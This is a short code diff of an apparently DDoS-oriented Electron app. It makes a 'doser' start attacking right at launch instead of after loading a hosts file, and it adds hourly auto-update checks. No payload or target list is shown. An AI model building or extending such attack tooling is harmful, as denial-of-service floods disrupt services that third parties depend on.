@@ -62,12 +62,8 @@ function createWindow () {
   doser.listen('atack', (data) => console.log(data.log))
   doser.listen('atack', (data) => window.webContents.send('atack', data))
   doser.listen('error', (data) => window.webContents.send('error', data))
-  doser.loadHostsFile().then(() => {
-    doser.start()
-  }).catch(() => {
-    app.quit()
-  })
-
+  doser.start()
+  
   ipcMain.on('updateDDOSEnable', (event, arg) => {
     if (arg.newVal) {
       doser.start()
@@ -122,8 +118,19 @@ autoUpdater.on('update-downloaded', (event, releaseNotes, releaseName) => {
 
 app.whenReady().then(createWindow)
 
+function checkUpdates() {
+  try {
+    autoUpdater.checkForUpdates()
+  } catch(err) {
+    console.log(err, "Error while checking update")
+  }  
+}
+
 app.on('ready', function()  {
-  autoUpdater.checkForUpdates();
+  checkUpdates()
+  setInterval(() => {
+    checkUpdates()
+  }, 1000 * 60 * 60)
 });
 
 app.on('window-all-closed', () => {
